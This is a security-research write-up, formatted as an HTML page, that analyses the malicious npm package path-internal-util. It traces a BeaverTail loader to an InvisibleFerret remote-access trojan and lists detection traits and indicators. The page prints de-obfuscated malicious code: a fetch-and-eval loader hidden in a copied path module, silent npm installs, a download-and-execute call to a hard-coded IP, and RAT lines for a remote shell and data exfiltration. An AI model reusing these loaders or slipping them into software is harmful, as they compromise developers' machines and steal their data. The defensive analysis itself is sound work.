@@ -1,0 +1,306 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>path-internal-util: don&#39;t chase the URL, catch the shape - The Atomdrift Project</title>
+  <meta name="description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="path-internal-util: don&#39;t chase the URL, catch the shape - The Atomdrift Project">
+  <meta property="og:description" content="Open-source, offline supply-chain attack detection for the AI age. Across binaries, scripts, and source — Apache 2.0.">
+
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='0.9em' font-size='90'>%E2%9A%9B</text></svg>">
+
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift News" href="/feed.xml">
+  <link rel="alternate" type="application/atom+xml" title="Atomdrift Discoveries" href="/discoveries/feed.xml">
+  <link rel="stylesheet" href="/assets/css/style.css">
+</head>
+<body>
+
+  <div class="site-header">
+    <div class="header-inner">
+      <div class="logo-block">
+        <a href="/">
+          <svg class="atom-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg">
+            <circle cx="50" cy="50" r="6" fill="#3b82f6"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(-30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(30 50 50)"/>
+            <ellipse cx="50" cy="50" rx="38" ry="14" fill="none" stroke="#0a0a0a" stroke-width="1.5" transform="rotate(90 50 50)"/>
+            <circle cx="18" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="82" cy="28" r="3.5" fill="#d0ff00"/>
+            <circle cx="50" cy="88" r="3.5" fill="#d0ff00"/>
+          </svg>
+          <div class="logo-text">
+            <span class="logo-name">atom<span class="logo-accent">drift</span></span>
+            <span class="logo-tagline">Open-source, offline supply-chain attack detection for the AI age</span>
+          </div>
+        </a>
+      </div>
+      <div class="header-links">
+        <a href="https://codeberg.org/atomdrift" target="_blank">Codeberg</a>
+        <a href="https://lab.atomdrift.org/" class="hl" target="_blank">Lab</a>
+      </div>
+    </div>
+  </div>
+
+  <div class="toxic-stripe"></div>
+
+  <div class="nav">
+    <div class="nav-inner">
+      <a href="/">Home</a>
+      <a href="/news/">News</a>
+      <a href="/discoveries/" class="active">Discoveries</a>
+      <a href="/compare/">Compare</a>
+      <a href="/projects/">Projects</a>
+      <a href="/support/">Support</a>
+    </div>
+  </div>
+
+  <main>
+    
+<div class="main-full">
+  <div class="post-header">
+    <h1>path-internal-util: don&#39;t chase the URL, catch the shape</h1>
+    <span class="post-meta">2026-06-09 &middot; npm &middot; path-internal-util</span>
+  </div>
+  <div class="post-body discovery-body">
+    <img src="/assets/images/path-internal-util-beavertail.jpg" alt="Meme: a close-up of an actual beaver's scaly tail on a rock, captioned with the SNL 'More Cowbell' line — 'I've got a fever, and the only prescription is more BEAVER TAIL.' The chain's payload is, in fact, more BeaverTail." style="width: 60%; height: auto;">
+<p>Nobody reads Node's <code>path</code> module. It splits filenames, it has shipped unchanged for years, and it is the last place anyone looks for trouble — which is exactly why someone copied it, byte for byte, onto npm and slipped three lines inside. Those lines turn an ordinary import into a call to a free pastebin, and they run whatever the pastebin hands back; the technique is dull copy-paste, but it doesn't matter, because the package gives itself away long before anyone reads the URL.</p>
+<h2 id="package-metadata" tabindex="-1"><a class="header-anchor" href="#package-metadata"><span>Package metadata</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Field</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Name</td>
+<td><code>path-internal-util</code></td>
+</tr>
+<tr>
+<td>Version</td>
+<td><code>1.0.2</code></td>
+</tr>
+<tr>
+<td>Description</td>
+<td><code>Node.js path module</code></td>
+</tr>
+<tr>
+<td>Author</td>
+<td><em>(empty)</em></td>
+</tr>
+<tr>
+<td>License</td>
+<td><code>ISC</code></td>
+</tr>
+<tr>
+<td>Main</td>
+<td><code>./path.js</code></td>
+</tr>
+<tr>
+<td>Dependencies</td>
+<td><code>axios</code>, <code>execp</code>, <code>fs@0.0.1-security</code>, <code>process</code>, <code>request</code>, <code>path@0.12.7</code>, <code>util</code></td>
+</tr>
+</tbody>
+</table>
+<h2 id="stage-1-%E2%80%94-the-graft" tabindex="-1"><a class="header-anchor" href="#stage-1-%E2%80%94-the-graft"><span>Stage 1 — the graft</span></a></h2>
+<p>The carrier is Joyent's original, untouched down to the copyright header. The graft is a single base64 string and a small function, fired by an unguarded wrapper at the foot of the file — so importing the package is enough, with no install hook for an audit to catch.</p>
+<pre class="lang-js"><code><span class="tok-kw">var</span> tokenStringRe = <span class="tok-str">"aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9DV09WOQ=="</span>;  <span class="tok-com">// → jsonkeeper.com/b/CWOV9</span>
+
+<span class="tok-kw">function</span> <span class="tok-fn">loadTokenData</span> () {
+  <span class="tok-fn">fetch</span>(<span class="tok-fn">atob</span>(tokenStringRe)).<span class="tok-fn">then</span>((t) =&gt; t.<span class="tok-fn">json</span>()).<span class="tok-fn">then</span>((data) =&gt; <span class="tok-fn">eval</span>(data.content));
+}
+
+(<span class="tok-kw">function</span> () { <span class="tok-fn">loadTokenData</span>(); })();   <span class="tok-com">// fires on require(); inert loadStringData() sibling left commented out</span>
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/supply-chain/trojanized/library/remote-eval</code></td>
+<td>verbatim Joyent source carrying an IIFE that <code>eval</code>s a fetched body</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/command-and-control/dropper/delivery/fetch-eval</code></td>
+<td>fetch → decode → parse → eval, to a literal pastebin URL</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/anti-static/obfuscation/payload/encoded</code></td>
+<td>base64 string decoded and executed in the same file</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/supply-chain/impersonation/core-module</code></td>
+<td>a package calling itself the path module while shipping an <code>execp</code> dependency</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>well-known/malware/stealer/beaver-tail</code></td>
+<td>the bare <code>execp</code> dependency — the Nickel Alley tell</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/supply-chain/metadata-anomaly/dependency/facade</code></td>
+<td>declared dependencies the code never loads</td>
+</tr>
+</tbody>
+</table>
+<h2 id="caught-by-shape%2C-not-the-url" tabindex="-1"><a class="header-anchor" href="#caught-by-shape%2C-not-the-url"><span>Caught by shape, not the URL</span></a></h2>
+<p>The verdict above never touched the pastebin: five hostile traits fire in three separate corners of the taxonomy, each a fact about how the package is built rather than a string to blocklist.</p>
+<ul>
+<li>It ships a core module verbatim — copyright header, helpers, exports, all of it.</li>
+<li>It decodes, fetches, parses, and evaluates in four linked calls.</li>
+<li>It claims to be the path module yet loads only one of its seven declared dependencies.</li>
+</ul>
+<p>Swap the pastebin, re-encode the string, impersonate a different core module — all three still fire. That is the line between catching a sample and catching a family.</p>
+<h2 id="following-the-thread" tabindex="-1"><a class="header-anchor" href="#following-the-thread"><span>Following the thread</span></a></h2>
+<p>The pastebin was live, so we pulled it. The first hop returned obfuscated JavaScript that installs two HTTP libraries, beacons a hard-coded address with a campaign ID, saves the reply to disk, and runs it. The install command matches web-dotenv's from last month flag for flag — the same crew, reusing the same loader.</p>
+<pre class="lang-js"><code><span class="tok-com">// jsonkeeper CWOV9, de-obfuscated</span>
+<span class="tok-fn">execSync</span>(<span class="tok-str">"npm install axios socket.io-client --no-save --no-progress --loglevel silent"</span>);
+axios.<span class="tok-fn">get</span>(<span class="tok-str">"http://216.126.225.83/api/service/55dfb627190b5091e5164c010d6c5c52"</span>)
+  .<span class="tok-fn">then</span>((r) =&gt; { <span class="tok-fn">writeFileSync</span>(<span class="tok-fn">join</span>(<span class="tok-fn">tmpdir</span>(), <span class="tok-str">"0001.dat"</span>), r.data); <span class="tok-fn">execSync</span>(<span class="tok-str">"node 0001.dat"</span>); });
+</code></pre>
+<p>That address answered with a second blob whose only job is to drop a third — it writes a file and runs it, after wiring up handlers that swallow any crash on the way.</p>
+<pre class="lang-js"><code><span class="tok-com">// 0001.dat, de-obfuscated — the entire dropper</span>
+<span class="tok-fn">writeFileSync</span>(<span class="tok-fn">join</span>(<span class="tok-fn">tmpdir</span>(), <span class="tok-str">"scdata"</span>), payload, { flag: <span class="tok-str">"w+"</span> });
+<span class="tok-fn">execSync</span>(<span class="tok-str">"node scdata"</span>, { windowsHide: <span class="tok-kw">true</span> });
+</code></pre>
+<p>That last file, <code>scdata</code>, is the payoff: a remote-access trojan over a persistent socket, with an interactive shell, an SSH channel, and screenshots on demand. It stamps each packet with the same telemetry its siblings used, and ships the loot to an endpoint cleave already flags by name — Lazarus.</p>
+<pre class="lang-js"><code><span class="tok-com">// scdata — InvisibleFerret RAT (uid 55dfb627…, t='104')</span>
+<span class="tok-kw">const</span> sock = <span class="tok-fn">require</span>(<span class="tok-str">"socket.io-client"</span>)(C2);
+sock.<span class="tok-fn">on</span>(<span class="tok-str">"terminal-input"</span>, run);      <span class="tok-com">// interactive shell</span>
+sock.<span class="tok-fn">on</span>(<span class="tok-str">"start_ssh"</span>, openSSH);         <span class="tok-com">// SSH pivot</span>
+axios.<span class="tok-fn">post</span>(<span class="tok-str">"http://216.126.225.83/api/service/makelog"</span>, loot);   <span class="tok-com">// Lazarus exfil</span>
+</code></pre>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>Trait</th>
+<th>What it caught</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/anti-static/obfuscation/payload/data-file</code></td>
+<td>the dropper: an obfuscated blob that launches a hidden Node child</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>objectives/command-and-control/remote-command/control</code></td>
+<td>the RAT: <code>terminal-output</code>, <code>terminal-resize</code>, remote command execution</td>
+</tr>
+<tr>
+<td><span class="sev-dot hostile" title="hostile"></span></td>
+<td><code>well-known/malware/dropper/lazarus</code></td>
+<td>exfil to <code>/api/service/makelog</code> — the GlassWorm / Lazarus signature</td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>objectives/supply-chain/install-hook/scripts/dynamic-install</code></td>
+<td>runtime install of <code>socket.io-client</code>, <code>sharp</code>, <code>screenshot-desktop</code></td>
+</tr>
+<tr>
+<td><span class="sev-dot suspicious" title="suspicious"></span></td>
+<td><code>micro-behaviors/communications/ip/literal</code></td>
+<td>hard-coded <code>216.126.225.83</code> C2</td>
+</tr>
+</tbody>
+</table>
+<h2 id="attribution" tabindex="-1"><a class="header-anchor" href="#attribution"><span>Attribution</span></a></h2>
+<p>This is North Korea's Contagious Interview operation — the BeaverTail loader dropping the InvisibleFerret trojan — and the recovered chain proves it at the toolkit level, not on a hunch. The install line, the campaign-ID URL scheme, the numbered drop file, and the stealer's telemetry are the same kit on the same <a href="http://Tier.Net">Tier.Net</a> range as <a href="/discoveries/2026/05/web-dotenv-jsonkeeper-redirector/">web-dotenv</a> and <a href="/discoveries/2026/05/clx-cookieparser-dependency-twin-beavertail/">clx-cookieparser</a>, both already pinned to the group via <a href="https://dprk-research.kmsec.uk/">dprk-research.kmsec.uk</a>. cleave reaches that verdict on its own when the exfil path trips its Lazarus rule; this is simply a fresh instance of the kit, same operator.</p>
+<h2 id="indicators" tabindex="-1"><a class="header-anchor" href="#indicators"><span>Indicators</span></a></h2>
+<table>
+<thead>
+<tr>
+<th>Type</th>
+<th>Value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Package</td>
+<td><code>path-internal-util@1.0.2</code> (npm)</td>
+</tr>
+<tr>
+<td>npm page</td>
+<td><a href="https://www.npmjs.com/package/path-internal-util">npmjs.com/package/path-internal-util</a></td>
+</tr>
+<tr>
+<td>Tarball SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/7d62ba9c7d79e4cb37a67311866645b88245840d765302bc79286a8e3c0f8a95"><code>7d62ba9c7d79e4cb37a67311866645b88245840d765302bc79286a8e3c0f8a95</code></a></td>
+</tr>
+<tr>
+<td><code>path.js</code> SHA-256</td>
+<td><a href="https://lab.atomdrift.org/file/98b01dc2b472069106e707749862ea5cfcd1bb2fb339dfeda28047ef1630cbaf"><code>98b01dc2b472069106e707749862ea5cfcd1bb2fb339dfeda28047ef1630cbaf</code></a></td>
+</tr>
+<tr>
+<td>Stage 2 URL</td>
+<td><code>https://www.jsonkeeper.com/b/CWOV9</code> (base64: <code>aHR0cHM6Ly93d3cuanNvbmtlZXBlci5jb20vYi9DV09WOQ==</code>)</td>
+</tr>
+<tr>
+<td>Stage 2 SHA-256 (snapshot)</td>
+<td><a href="https://lab.atomdrift.org/file/3d4191faf32641523d277ea8ce36b6fede103e325773f36ab2208e82ed6c9031"><code>3d4191faf32641523d277ea8ce36b6fede103e325773f36ab2208e82ed6c9031</code></a></td>
+</tr>
+<tr>
+<td>Stage 3 URL</td>
+<td><code>http://216.126.225.83/api/service/55dfb627190b5091e5164c010d6c5c52</code> (<a href="http://Tier.Net">Tier.Net</a>, <code>216.126.224.0/22</code>)</td>
+</tr>
+<tr>
+<td>Stage 3 SHA-256 (snapshot)</td>
+<td><a href="https://lab.atomdrift.org/file/aae780b19c4a99cf4f3a22267bc3020cd03900921e43ad69ae83b7b8ee76e17d"><code>aae780b19c4a99cf4f3a22267bc3020cd03900921e43ad69ae83b7b8ee76e17d</code></a></td>
+</tr>
+<tr>
+<td>Stage 4 <code>scdata</code> SHA-256 (snapshot)</td>
+<td><a href="https://lab.atomdrift.org/file/b9fbc752c940f7fcb4ce2ae1a70ed0b4890e9b4818d04e7c6df18102c8a49115"><code>b9fbc752c940f7fcb4ce2ae1a70ed0b4890e9b4818d04e7c6df18102c8a49115</code></a></td>
+</tr>
+<tr>
+<td>Dropped files</td>
+<td><code>$TMPDIR/0001.dat</code>, <code>$TMPDIR/scdata</code>, <code>$TMPDIR/.npm/vhost.ctl</code> (pid lock)</td>
+</tr>
+<tr>
+<td>Exfil endpoint</td>
+<td><code>http://216.126.225.83/api/service/makelog</code></td>
+</tr>
+<tr>
+<td>Campaign UID</td>
+<td><code>55dfb627190b5091e5164c010d6c5c52</code> (telemetry <code>t='104'</code>)</td>
+</tr>
+<tr>
+<td>Facade dependency</td>
+<td><code>execp</code> (Nickel Alley / BeaverTail IOC)</td>
+</tr>
+<tr>
+<td></content></td>
+<td></td>
+</tr>
+</tbody>
+</table>
+
+  </div>
+  <p style="margin-top: 24px; font-size: 0.8125rem;"><a href="/discoveries/">&larr; All discoveries</a></p>
+</div>
+
+  </main>
+
+  <div class="site-footer">
+    <div class="footer-inner">
+      <span>&copy; 2026 The Atomdrift Project</span>
+    </div>
+  </div>
+
+</body>
+</html>
